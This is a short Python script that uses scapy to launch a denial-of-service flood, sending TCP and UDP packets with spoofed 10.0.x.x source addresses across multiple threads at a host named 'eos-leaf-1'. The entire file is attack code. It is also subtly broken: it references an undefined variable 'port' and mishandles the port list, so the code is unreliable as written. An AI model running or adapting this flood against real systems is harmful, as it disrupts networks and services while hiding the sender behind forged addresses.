from scapy.all import *
from threading import Thread
import time

def sendPackets(subnetMin,subnetMax,victimAddress,victimPort):
	for i in range(subnetMin,subnetMax):
		for j in range(0,255):
			for port in victimPort:
				packetTCP = IP(dst=victimAddress,src="10.0." + str(i) + "." + str(j),ttl=25)/TCP(dport=port)
				packetUDP = IP(dst=victimAddress,src="10.0." + str(i) + "." + str(j),ttl=25)/UDP(dport=port)
				send(packetTCP)
				send(packetUDP)
				print("victim sees 10.0." + str(i) + "." + str(j))
				time.sleep(1)


def startDDOS(victimAddress,victimPort,numThreads):
	for i in range(1,numThreads):
		threadRange = 256/numThreads
		rangeMin = i*int(threadRange) - (int(threadRange)-1)
		rangeMax = i*int(threadRange)
		thread = Thread(target=sendPackets,args=(rangeMin,rangeMax,victimAddress,int(port)))
		thread.start()

ports = ["22","80","8080","3333","1234"]
startDDOS("eos-leaf-1",ports,64)
